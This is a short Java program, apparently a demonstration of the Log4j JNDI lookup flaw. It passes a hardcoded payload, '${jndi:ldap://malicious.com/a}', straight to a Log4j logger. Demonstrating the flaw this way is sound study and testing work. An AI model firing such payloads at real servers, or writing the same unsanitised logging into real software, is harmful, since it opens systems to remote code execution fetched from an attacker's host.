import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class VulnerableApp {
    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);

    public static void main(String[] args) {
        String userInput = "${jndi:ldap://malicious.com/a}";
        logger.error("User error: " + userInput);
    }
}
